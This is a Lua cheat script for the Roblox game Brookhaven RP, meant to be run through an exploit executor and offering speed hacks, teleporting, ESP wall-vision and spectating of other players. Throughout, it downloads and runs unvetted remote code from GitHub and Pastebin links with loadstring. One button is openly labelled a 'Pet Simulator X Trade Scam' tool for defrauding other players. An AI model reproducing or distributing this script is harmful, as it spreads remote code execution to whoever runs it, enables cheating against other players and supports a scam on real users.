local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
local Window = OrionLib:MakeWindow({Name = "Tubers93 | Brookhaven RP | Executor: Solara", HidePremium = false, SaveConfig = true, ConfigFolder = "OrionTest"})


-- Credits
local Tab = Window:MakeTab({
    Name = "Information",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})

Tab:AddLabel("Thanks you for using my Scripts! The Owner is Jasson1875")
Tab:AddLabel("His Tiktok is deakerk18")

Tab:AddLabel("Update Version | V1.01")
Tab:AddTextbox({
	Name = "Discord",
	Default = "https://discord.gg/tmJ7fqc8j4",
	TextDisappear = true,
	Callback = function(Value)
		print(Value)
	end	  
})

-- TAB NUMMER EINS (ANFANG)
local Tab = Window:MakeTab({
    Name = "Main",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})
-- Slider
Tab:AddSlider({
    Name = "Walkspeed",
    Min = 1,
    Max = 10000,
    Default = 16,  -- Typischer Default-Walkspeed für Roblox
    Color = Color3.fromRGB(255, 255, 255),
    Increment = 1,
    ValueName = "Walkspeed",
    Callback = function(Value)
        local localPlayer = game:GetService("Players").LocalPlayer
        local humanoid = localPlayer.Character and localPlayer.Character:FindFirstChildOfClass("Humanoid")
        if humanoid then
            humanoid.WalkSpeed = Value
        end
    end
})

local localPlayer = game:GetService("Players").LocalPlayer
local uis = game:GetService("UserInputService")
local isRunning = false
local multiplier = 1

task.spawn(function()
    local hint = Instance.new("Hint", workspace)
    hint.Text = "Speed Loaded by Tubers93"
    task.wait(2)
    hint:Destroy()
end)

uis.InputBegan:Connect(function(i, gp)
    if gp then return end
    if i.KeyCode == Enum.KeyCode.Q then
        isRunning = true
        while isRunning do
            task.wait()
            local character = localPlayer.Character
            local humanoidRootPart = character and character:FindFirstChild("HumanoidRootPart")
            if humanoidRootPart then
                humanoidRootPart.CFrame = humanoidRootPart.CFrame + humanoidRootPart.CFrame.LookVector * multiplier
            end
        end
    end
end)

uis.InputEnded:Connect(function(i, gp)
    if gp then return end
    if i.KeyCode == Enum.KeyCode.Q then
        isRunning = false
    end
end)
local observing = false
local selectedPlayer = nil
local camera = workspace.CurrentCamera
local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")

local Section = Tab:AddSection({
    Name = "Player view"
})
-- Spieler beobachten
local observing = false
local selectedPlayer = nil
local camera = workspace.CurrentCamera
local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local LocalPlayer = Players.LocalPlayer
Tab:AddTextbox({
    Name = "Player",
    Default = "input",
    TextDisappear = true,
    Callback = function(Value)
        local player = Players:FindFirstChild(Value)
        if player and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
            selectedPlayer = player
            print("Selected player: " .. Value)
        else
            print("Player not found or player has no character")
        end
    end
})

Tab:AddToggle({
	Name = "View",
	Default = false,
	Callback = function(Value)
		observing = Value

        if observing and selectedPlayer then
            camera.CameraSubject = selectedPlayer.Character.Humanoid
            camera.CameraType = Enum.CameraType.Attach
            print("Observing player: " .. selectedPlayer.Name)

            local function onInput(input, gameProcessedEvent)
                if gameProcessedEvent then return end
                if input.KeyCode == Enum.KeyCode.Escape then
                    camera.CameraSubject = LocalPlayer.Character:FindFirstChild("Humanoid")
                    camera.CameraType = Enum.CameraType.Custom
                    UserInputService.InputBegan:Disconnect(onInput)
                    print("Observation cancelled, back to own character")
                end
            end

            UserInputService.InputBegan:Connect(onInput)
        else
            camera.CameraSubject = LocalPlayer.Character:FindFirstChild("Humanoid")
            camera.CameraType = Enum.CameraType.Custom
            print("Stopped observing, back to own character")
        end
	end    
})

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

-- GUI für den Spieler-Namen und Teleport-Button
local Section = Tab:AddSection({
    Name = "Player TP"
})
Tab:AddTextbox({
    Name = "Username",
    Default = "Input",
    TextDisappear = true,
    Callback = function(Value)
        SelectedPlayer = Value
    end	  
})
 -- TP Button
Tab:AddButton({
    Name = "Teleport",
    Callback = function()
        local targetPlayer = Players:FindFirstChild(SelectedPlayer)
        if targetPlayer and targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart") then
            LocalPlayer.Character:FindFirstChild("HumanoidRootPart").CFrame = targetPlayer.Character.HumanoidRootPart.CFrame
        else
            print("Spieler nicht gefunden oder der Spieler hat keinen Charakter.")
        end
    end
})

local Section = Tab:AddSection({
    Name = "ESP"
})


local espEnabled = false
local espTransparency = 0.5
local espColor = Color3.fromRGB(255, 255, 255)
local selectedColor = espColor

local function createESP(player)
    if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
        if player.Character.HumanoidRootPart:FindFirstChild("ESPBox") then
            player.Character.HumanoidRootPart:FindFirstChild("ESPBox"):Destroy()
        end
        local espBox = Instance.new("BoxHandleAdornment")
        espBox.Name = "ESPBox"
        espBox.Size = player.Character.HumanoidRootPart.Size
        espBox.Adornee = player.Character.HumanoidRootPart
        espBox.Color3 = espColor
        espBox.Transparency = espTransparency
        espBox.AlwaysOnTop = true
        espBox.ZIndex = 10
        espBox.Parent = player.Character.HumanoidRootPart
    end
end

local function removeESP(player)
    if player.Character and player.Character:FindFirstChild("HumanoidRootPart") and player.Character.HumanoidRootPart:FindFirstChild("ESPBox") then
        player.Character.HumanoidRootPart:FindFirstChild("ESPBox"):Destroy()
    end
end

local function toggleESP()
    espEnabled = not espEnabled
    for _, player in ipairs(game:GetService("Players"):GetPlayers()) do
        if espEnabled then
            createESP(player)
        else
            removeESP(player)
        end
    end
end

Tab:AddButton({
    Name = "Toggle ESP",
    Callback = function()
        toggleESP()
    end    
})

Tab:AddSlider({
    Name = "Transparency",
    Min = 0,
    Max = 1,
    Default = 0.5,
    Increment = 0.1,
    Callback = function(Value)
        espTransparency = Value
        if espEnabled then
            for _, player in ipairs(game:GetService("Players"):GetPlayers()) do
                createESP(player)
            end
        end
    end    
})

Tab:AddButton({
    Name = "Change ESP Color",
    Callback = function()
        local colorWindow = Instance.new("ScreenGui")
        colorWindow.Name = "ColorWindow"
        colorWindow.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")

        local frame = Instance.new("Frame")
        frame.Size = UDim2.new(0, 200, 0, 150)
        frame.Position = UDim2.new(0.5, -100, 0.5, -75)
        frame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
        frame.Parent = colorWindow

        local redButton = Instance.new("TextButton")
        redButton.Size = UDim2.new(0, 50, 0, 50)
        redButton.Position = UDim2.new(0, 10, 0, 10)
        redButton.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
        redButton.Text = ""
        redButton.Parent = frame
        redButton.MouseButton1Click:Connect(function()
            selectedColor = Color3.fromRGB(255, 0, 0)
        end)

        local greenButton = Instance.new("TextButton")
        greenButton.Size = UDim2.new(0, 50, 0, 50)
        greenButton.Position = UDim2.new(0, 70, 0, 10)
        greenButton.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
        greenButton.Text = ""
        greenButton.Parent = frame
        greenButton.MouseButton1Click:Connect(function()
            selectedColor = Color3.fromRGB(0, 255, 0)
        end)

        local blueButton = Instance.new("TextButton")
        blueButton.Size = UDim2.new(0, 50, 0, 50)
        blueButton.Position = UDim2.new(0, 130, 0, 10)
        blueButton.BackgroundColor3 = Color3.fromRGB(0, 0, 255)
        blueButton.Text = ""
        blueButton.Parent = frame
        blueButton.MouseButton1Click:Connect(function()
            selectedColor = Color3.fromRGB(0, 0, 255)
        end)

        local applyButton = Instance.new("TextButton")
        applyButton.Size = UDim2.new(0, 180, 0, 40)
        applyButton.Position = UDim2.new(0, 10, 0, 80)
        applyButton.Text = "Apply Color"
        applyButton.Parent = frame
        applyButton.MouseButton1Click:Connect(function()
            espColor = selectedColor
            if espEnabled then
                for _, player in ipairs(game:GetService("Players"):GetPlayers()) do
                    createESP(player)
                end
            end
            colorWindow:Destroy()
        end)
    end    
})

-- TAB NUMMER ZWEI (ANFANG)
local Tab = Window:MakeTab({
	Name = "Player",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

local function resetCharacterByKilling()
    local Character = LocalPlayer.Character
    if Character then
        local humanoid = Character:FindFirstChildOfClass("Humanoid")
        if humanoid then
            humanoid.Health = 0
        end
    end
end

Tab:AddLabel("Reset Character:")

Tab:AddButton({
    Name = "Reset by Kill",
    Callback = function()
        resetCharacterByKilling()
    end
})



local Section = Tab:AddSection({
    Name = "Fire avatar (Loop)"
})
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

local isRainbowActive = false

local function setRainbowAvatar()
    local function lerpColor(color1, color2, t)
        return Color3.new(
            color1.R + (color2.R - color1.R) * t,
            color1.G + (color2.G - color1.G) * t,
            color1.B + (color2.B - color1.B) * t
        )
    end

    local function updateAvatarColors()
        local colors = {Color3.fromRGB(255,0,0), Color3.fromRGB(255,127,0), Color3.fromRGB(255,255,0), Color3.fromRGB(0,255,0), Color3.fromRGB(0,0,255), Color3.fromRGB(75,0,130), Color3.fromRGB(148,0,211)}
        local numColors = #colors
        local speed = 0.5

        while isRainbowActive do
            local t = (tick() * speed) % 1
            local index = math.floor(t * numColors) + 1
            local nextIndex = (index % numColors) + 1
            local color = lerpColor(colors[index], colors[nextIndex], t % (1 / numColors) * numColors)
            
            local Character = LocalPlayer.Character

            if Character then
                for _, part in ipairs(Character:GetChildren()) do
                    if part:IsA("BasePart") then
                        part.BrickColor = BrickColor.new(color)
                    end
                end
            end

            wait(0.1)
        end
    end

    updateAvatarColors()
end
local function resetAvatarColor()
    local Character = LocalPlayer.Character

    if Character then
        for _, part in ipairs(Character:GetChildren()) do
            if part:IsA("BasePart") then
                part.BrickColor = BrickColor.new("Bright blue")
            end
        end
    end
end

local function toggleRainbowEffect(isActive)
    if isActive then
        isRainbowActive = true
        setRainbowAvatar()
    else
        isRainbowActive = false
        resetAvatarColor()
    end
end

-- Erstelle einen Button
Tab:AddButton({
    Name = "Activate Effect",
    Callback = function()
        -- Effekt-Skript
        local player = game.Players.LocalPlayer
        local character = player.Character or player.CharacterAdded:Wait()
        local humanoidRootPart = character:WaitForChild("HumanoidRootPart")

        -- Erstellen eines neuen Partikelsystems
        local particleEmitter = Instance.new("ParticleEmitter")
        particleEmitter.Color = ColorSequence.new(Color3.fromRGB(255, 0, 0)) -- Rot
        particleEmitter.Size = NumberSequence.new(1, 5)
        particleEmitter.Lifetime = NumberRange.new(1, 2)
        particleEmitter.Rate = 100
        particleEmitter.Parent = humanoidRootPart
    end    
})

local Section = Tab:AddSection({
    Name = "Minecraft Block TP Random"
})
-- Erstelle einen Button
Tab:AddButton({
    Name = "Activate Glitch Effect",
    Callback = function()
        -- Glitch-Effekt-Skript
        local player = game.Players.LocalPlayer
        local character = player.Character or player.CharacterAdded:Wait()
        local humanoidRootPart = character:WaitForChild("HumanoidRootPart")

        local function createGlitchEffect()
            local glitchPart = Instance.new("Part")
            glitchPart.Size = Vector3.new(5, 5, 5)
            glitchPart.Position = humanoidRootPart.Position + Vector3.new(0, 10, 0)
            glitchPart.BrickColor = BrickColor.new("Bright red")
            glitchPart.Transparency = 0.5
            glitchPart.Anchored = true
            glitchPart.CanCollide = false
            glitchPart.Parent = workspace

            while glitchPart do
                glitchPart.Position = glitchPart.Position + Vector3.new(math.random(), math.random(), math.random())
                wait(0.1)
            end
        end

        createGlitchEffect()
    end    
})

-- Definiere die Sektion in deinem Tab
local Section = Tab:AddSection({
    Name = "Avatar size"
})

-- Funktion zum Anpassen der Größe des Avatars
local function setAvatarSize(sizeMultiplier)
    local Players = game:GetService("Players")
    local LocalPlayer = Players.LocalPlayer
    local Character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
    
    if Character then
        for _, part in ipairs(Character:GetChildren()) do
            if part:IsA("BasePart") then
                part.Size = part.Size * sizeMultiplier
            end
        end
    end
end

-- Funktion zum Zurücksetzen der Größe des Avatars
local function resetAvatarSize()
    local Players = game:GetService("Players")
    local LocalPlayer = Players.LocalPlayer
    local Character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()

    if Character then
        for _, part in ipairs(Character:GetChildren()) do
            if part:IsA("BasePart") then
                part.Size = Vector3.new(2, 2, 1) -- Originalgröße oder gewünschte Normalgröße
            end
        end
    end
end

-- Funktionen zum Setzen der Größe
local function setSmallAvatar()
    setAvatarSize(0.5) -- Klein
end

local function setMediumAvatar()
    setAvatarSize(1) -- Mittel
end

local function setBigAvatar()
    setAvatarSize(2) -- Groß
end

-- Beispiel-Button für "Small"
Tab:AddButton({
    Name = "Small",
    Callback = function()
        setSmallAvatar()
    end    
})

-- Beispiel-Button für "Medium"
Tab:AddButton({
    Name = "Medium",
    Callback = function()
        setMediumAvatar()
    end    
})

-- Beispiel-Button für "Big"
Tab:AddButton({
    Name = "Big",
    Callback = function()
        setBigAvatar()
    end    
})

-- Beispiel-Button für "Refresh"
Tab:AddButton({
    Name = "Refresh",
    Callback = function()
        resetAvatarSize()
    end    
})

-- TAB NUMMER DREI (ANFANG)
local Tab = Window:MakeTab({
    Name = "House",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})

local houseNumber = ""

Tab:AddTextbox({
    Name = "House Number",
    Default = "",
    TextDisappear = true,
    Callback = function(Value)
        houseNumber = Value
    end    
})

Tab:AddButton({
    Name = "Get Permission",
    Callback = function()
        local Players = game:GetService("Players")
        local LocalPlayer = Players.LocalPlayer

        local function setAsResident(houseNumber)
            if not houseNumber or houseNumber == "" then
                print("Bitte gib eine gültige Hausnummer ein.")
                return
            end

            local house = workspace:FindFirstChild(houseNumber)
            if not house then
                print("Haus mit Nummer " .. houseNumber .. " nicht gefunden.")
                return
            end

            if not house:IsA("Model") then
                print("Das gefundene Objekt ist kein Modell.")
                return
            end

            local permissions = house:FindFirstChild("Permissions") or Instance.new("Folder")
            permissions.Name = "Permissions"
            permissions.Parent = house

            -- Setze den Spieler als Bewohner
            local playerPermission = permissions:FindFirstChild(LocalPlayer.Name) or Instance.new("BoolValue")
            playerPermission.Name = LocalPlayer.Name
            playerPermission.Value = true
            playerPermission.Parent = permissions
            
            print("Du bist jetzt Bewohner des Hauses mit der Nummer:", houseNumber)
        end

        -- Setze den Spieler als Bewohner des angegebenen Hauses
        setAsResident(houseNumber)
    end
})

local Section = Tab:AddSection({
    Name = "coming coon"
})

local Section = Tab:AddSection({
    Name = "coming coon"
})

local Section = Tab:AddSection({
    Name = "coming coon"
})

local Section = Tab:AddSection({
    Name = "coming coon"
})

local Section = Tab:AddSection({
    Name = "coming coon"
})

local Section = Tab:AddSection({
    Name = "coming coon"
})

-- TAB NUMMER VIER (ANFANG)
local Tab = Window:MakeTab({
	Name = "Cars",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})

local Section = Tab:AddSection({
    Name = "coming coon"
})

local Section = Tab:AddSection({
    Name = "coming coon"
})

local Section = Tab:AddSection({
    Name = "coming coon"
})
local Section = Tab:AddSection({
    Name = "coming coon"
})

local Section = Tab:AddSection({
    Name = "coming coon"
})

local Section = Tab:AddSection({
    Name = "coming coon"
})

-- TAB NUMMER FÜNF (ANFANG)
local Tab = Window:MakeTab({
	Name = "Executor's",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})

local Section = Tab:AddSection({
	Name = "Tools"
})
 
Tab:AddButton({ 	Name  = "Arceus x", 	Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/AZYsGithub/chillz-workshop/main/Arceus%20X%20V3"))()
end })
 
Tab:AddButton({ 	Name  = "Synapse X", 	Callback = function()
loadstring(game:HttpGet("https://pastebin.com/raw/qhu8B3sx"))()
end })
 
Tab:AddButton({ 	Name  = "Neptune", 	Callback = function()
loadstring(game:HttpGet('https://pastebin.com/raw/y3jhxS5r'))()
end })
 
Tab:AddButton({ 	Name  = "Vega X", 	Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/NathTheDev/Project/main/Vega%20X.lua"))()
end })
 
Tab:AddButton({ 	Name  = "Invis", 	Callback = function()
loadstring(game:HttpGet('https://pastebin.com/raw/AYtzGEPb'))()
end })

local Section = Tab:AddSection({
    Name = "coming coon"
})

local Section = Tab:AddSection({
    Name = "coming coon"
})

local Section = Tab:AddSection({
    Name = "coming coon"
})


local Tab = Window:MakeTab({
	Name = "Pet Simulator X",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})
 
Tab:AddButton({ 	Name = "Pet Simulator X Menu", 	Callback = function() loadstring(game:HttpGet("https://raw.githubusercontent.com/Rafacasari/roblox-scripts/main/psx.lua"))()
 
 end })
 
 
Tab:AddButton({ 	Name = "Pet Simulator X HUB (Best)", 	Callback = function() loadstring(game:HttpGet("https://pastebin.com/raw/BdvUGb2q"))()
 
 end })
 
 
Tab:AddButton({ 	Name = "Pet Simulator X Trade Scam ", 	Callback = function() loadstring(game:HttpGet("https://raw.githubusercontent.com/IlllIlIIIlllIlIlllIIlIlllIlIIlllI/PartnerPSX/main/FakePartnerTag", true))()
 
end})

Tab:AddParagraph("imformation","just another attment at a trade scam")

local Section = Tab:AddSection({
    Name = "coming coon"
})

local Section = Tab:AddSection({
    Name = "coming coon"
})

local Section = Tab:AddSection({
    Name = "coming coon"
})


-- TAB NUMMER SECHS (ANFANG)
local Tab = Window:MakeTab({
	Name = "Others",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})

Tab:AddButton({
    Name = "Activate Infinite Yield",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()
    end    
})
Tab:AddParagraph("imformation","All Commands >>>")



